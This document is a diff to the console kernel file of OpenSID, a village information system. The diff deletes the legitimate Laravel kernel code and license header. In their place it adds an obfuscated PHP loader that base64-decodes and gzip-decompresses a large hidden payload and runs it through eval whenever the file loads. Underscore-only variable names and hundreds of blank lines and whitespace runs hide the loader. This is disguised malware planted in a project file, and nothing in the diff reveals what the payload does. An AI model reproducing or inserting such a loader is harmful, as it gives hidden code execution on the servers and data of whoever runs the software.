@@ -1,359 +1,385 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Console/Kernel.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Console;
 
-use App\Console\Commands\AcakDataCommand;
-use App\Console\Commands\ModuleCommand;
-use App\Console\Commands\Modules\MigrationMakeCommand;
-use App\Console\Commands\Modules\SeedMakeCommand;
-use App\Console\Commands\SetupCommand;
-use App\Console\Commands\ViewClearCommand;
-use App\Exceptions\Handler;
-use App\Services\Laravel;
-use Illuminate\Console\Application as Artisan;
-use Illuminate\Console\Events\CommandFinished;
-use Illuminate\Console\Events\CommandStarting;
-use Illuminate\Console\Scheduling\Schedule;
-use Illuminate\Console\Scheduling\ScheduleRunCommand;
-use Illuminate\Contracts\Console\Kernel as KernelContract;
-use Illuminate\Contracts\Debug\ExceptionHandler;
-use Illuminate\Events\Dispatcher;
-use Illuminate\Http\Request;
-use Illuminate\Support\Arr;
-use RuntimeException;
-use Symfony\Component\Console\ConsoleEvents;
-use Symfony\Component\Console\Event\ConsoleCommandEvent;
-use Symfony\Component\Console\Event\ConsoleTerminateEvent;
-use Symfony\Component\EventDispatcher\EventDispatcher;
-use Throwable;
 
-class Kernel implements KernelContract
-{
-    /**
-     * The Symfony event dispatcher implementation.
-     *
-     * @var \Symfony\Contracts\EventDispatcher\EventDispatcherInterface|null
-     */
-    protected $symfonyDispatcher;
 
-    /**
-     * The Artisan application instance.
-     *
-     * @var Artisan
-     */
-    protected $artisan;
 
-    /**
-     * Indicates if facade aliases are enabled for the console.
-     *
-     * @var bool
-     */
-    protected $aliases = true;
 
-    /**
-     * The Artisan commands provided by the application.
-     *
-     * @var array
-     */
-    protected $commands = [
-        AcakDataCommand::class,
-        ViewClearCommand::class,
-        ModuleCommand::class,
-        MigrationMakeCommand::class,
-        SeedMakeCommand::class,
-        SetupCommand::class,
-    ];
 
-    /**
-     * Create a new console kernel instance.
-     *
-     * @return void
-     */
-    public function __construct(
-        /**
-         * The application implementation.
-         */
-        protected Laravel $app
-    ) {
-        if ($this->app->runningInConsole()) {
-            $this->setRequestForConsole($this->app);
-        } else {
-            $this->rerouteSymfonyCommandEvents();
-        }
 
-        $this->app->prepareForConsoleCommand($this->aliases);
-        $this->defineConsoleSchedule();
-    }
 
-    /**
-     * Set the request instance for URL generation.
-     *
-     * @return void
-     */
-    protected function setRequestForConsole(Laravel $app)
-    {
-        $server = $_SERVER;
 
-        $server = array_merge($server, [
-            'SCRIPT_FILENAME' => 'artisan',
-            'SCRIPT_NAME'     => 'artisan',
-            'PHP_SELF'        => 'artisan',
-            'PATH_TRANSLATED' => 'artisan',
-            'argv'            => Arr::except($server['argv'], 0),
-        ]);
 
-        $_SERVER = $server;
 
-        $app->instance('request', Request::create(
-            base_url(),
-            'GET',
-            [],
-            [],
-            [],
-            $server
-        ));
-    }
 
-    /**
-     * Re-route the Symfony command events to their Laravel counterparts.
-     *
-     * @internal
-     *
-     * @return $this
-     */
-    public function rerouteSymfonyCommandEvents()
-    {
-        if (null === $this->symfonyDispatcher) {
-            $this->symfonyDispatcher = new EventDispatcher();
 
-            $this->symfonyDispatcher->addListener(ConsoleEvents::COMMAND, function (ConsoleCommandEvent $event) {
-                $this->app[Dispatcher::class]->dispatch(
-                    new CommandStarting($event->getCommand()->getName(), $event->getInput(), $event->getOutput())
-                );
-            });
 
-            $this->symfonyDispatcher->addListener(ConsoleEvents::TERMINATE, function (ConsoleTerminateEvent $event) {
-                $this->app[Dispatcher::class]->dispatch(
-                    new CommandFinished($event->getCommand()->getName(), $event->getInput(), $event->getOutput(), $event->getExitCode())
-                );
-            });
-        }
 
-        return $this;
-    }
 
-    /**
-     * Define the application's command schedule.
-     *
-     * @return void
-     */
-    protected function defineConsoleSchedule()
-    {
-        $this->app->instance(
-            Schedule::class,
-            $schedule = new Schedule()
-        );
 
-        $this->schedule($schedule);
-    }
 
-    /**
-     * Run the console application.
-     *
-     * @param \Symfony\Component\Console\Input\InputInterface   $input
-     * @param \Symfony\Component\Console\Output\OutputInterface $output
-     *
-     * @return int
-     */
-    public function handle($input, $output = null)
-    {
-        try {
-            $this->app->boot();
 
-            return $this->getArtisan()->run($input, $output);
-        } catch (Throwable $e) {
-            $this->reportException($e);
 
-            $this->renderException($output, $e);
 
-            return 1;
-        }
-    }
 
-    /**
-     * Bootstrap the application for artisan commands.
-     */
-    public function bootstrap(): void
-    {
 
-    }
 
-    /**
-     * Terminate the application.
-     *
-     * @param \Symfony\Component\Console\Input\InputInterface $input
-     * @param int                                             $status
-     */
-    public function terminate($input, $status): void
-    {
 
-    }
 
-    /**
-     * Define the application's command schedule.
-     *
-     * @return void
-     */
-    protected function schedule(Schedule $schedule)
-    {
 
-    }
 
-    /**
-     * Run an Artisan console command by name.
-     *
-     * @param string     $command
-     * @param mixed|null $outputBuffer
-     *
-     * @return int
-     */
-    public function call($command, array $parameters = [], $outputBuffer = null)
-    {
-        return $this->getArtisan()->call($command, $parameters, $outputBuffer);
-    }
 
-    /**
-     * Queue the given console command.
-     *
-     * @param string $command
-     */
-    public function queue($command, array $parameters = []): void
-    {
-        throw new RuntimeException('Queueing Artisan commands is not supported.');
-    }
 
-    /**
-     * Get all of the commands registered with the console.
-     *
-     * @return array
-     */
-    public function all()
-    {
-        return $this->getArtisan()->all();
-    }
 
-    /**
-     * Get the output for the last run command.
-     *
-     * @return string
-     */
-    public function output()
-    {
-        return $this->getArtisan()->output();
-    }
 
-    /**
-     * Get the Artisan application instance.
-     *
-     * @return Artisan
-     */
-    protected function getArtisan()
-    {
-        if (null === $this->artisan) {
-            $artisan = new Artisan($this->app, $this->app->make('events'), $this->app->version());
-            $artisan->setName('OpenSID');
-            $artisan->resolveCommands($this->getCommands());
-            $artisan->setContainerCommandLoader();
 
-            if ($this->symfonyDispatcher instanceof EventDispatcher) {
-                $artisan->setDispatcher($this->symfonyDispatcher);
-                $artisan->setSignalsToDispatchEvent();
-            }
 
-            return $this->artisan = $artisan;
-        }
 
-        return $this->artisan;
-    }
 
-    /**
-     * Get the commands to add to the application.
-     */
-    protected function getCommands(): array
-    {
-        return array_merge($this->commands, [
-            ScheduleRunCommand::class,
-        ]);
-    }
 
-    /**
-     * Report the exception to the exception handler.
-     *
-     * @return void
-     */
-    protected function reportException(Throwable $e)
-    {
-        $this->resolveExceptionHandler()->report($e);
-    }
 
-    /**
-     * Report the exception to the exception handler.
-     *
-     * @param \Symfony\Component\Console\Output\OutputInterface $output
-     *
-     * @return void
-     */
-    protected function renderException($output, Throwable $e)
-    {
-        $this->resolveExceptionHandler()->renderForConsole($output, $e);
-    }
 
-    /**
-     * Get the exception handler from the container.
-     *
-     * @return ExceptionHandler
-     */
-    protected function resolveExceptionHandler()
-    {
-        if ($this->app->bound(ExceptionHandler::class)) {
-            return $this->app->make(ExceptionHandler::class);
-        }
 
-        return $this->app->make(Handler::class);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
